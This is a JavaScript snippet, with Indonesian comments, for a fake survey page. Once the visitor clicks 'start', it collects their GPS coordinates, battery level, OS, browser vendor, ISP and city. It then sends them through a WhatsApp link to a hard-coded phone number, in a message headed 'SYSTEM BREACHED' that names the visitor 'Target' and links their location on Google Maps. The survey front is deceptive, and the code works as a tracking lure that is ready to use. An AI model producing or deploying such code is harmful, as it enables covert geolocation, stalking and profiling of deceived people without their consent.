const nomorWA = "628979100200";
let userData = { 
    coords: "Fetching...", 
    os: navigator.platform,
    battery: "Scanning...",
    isp: "Detecting...",
    vendor: navigator.vendor
};

// 1. Ambil Data Tambahan (Baterai & ISP)
async function getMoreData() {
    // Cek Baterai
    if (navigator.getBattery) {
        const bat = await navigator.getBattery();
        userData.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
    }
    
    // Cek ISP/Provider via IP (Pake API Publik gratis)
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org; // Nama Provider (Misal: Telkomsel/Indihome)
        userData.city = data.city;
    } catch (e) { userData.isp = "Protected"; }
}

document.getElementById('start-survey').addEventListener('click', async () => {
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    getMoreData(); // Jalankan pengambilan data tambahan

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            userData.coords = `${pos.coords.latitude},${pos.coords.longitude}`;
        });
    }
    // ... (sisanya sama dengan sebelumnya) ...
});

function processSubmit() {
    const name = document.getElementById('name').value;
    if (!name) return alert("Masukkan nama!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const interval = setInterval(() => {
        prg += 20;
        document.getElementById('progress').style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(interval);
            
            // Link Google Maps Berdasarkan Koordinat
            const mapLink = `https://www.google.com/maps?q=${userData.coords}`;
            
            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
                        `👤 *Target:* ${name}%0A` +
                        `📍 *Maps:* ${mapLink}%0A` +
                        `📡 *ISP:* ${userData.isp}%0A` +
                        `🔋 *Battery:* ${userData.battery}%0A` +
                        `💻 *OS:* ${userData.os}%0A` +
                        `🌐 *Vendor:* ${userData.vendor}%0A%0A` +
                        `_Data has been mirrored to master database._`;

            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 800);
}
// ... (tambah listener enter seperti sebelumnya) ...
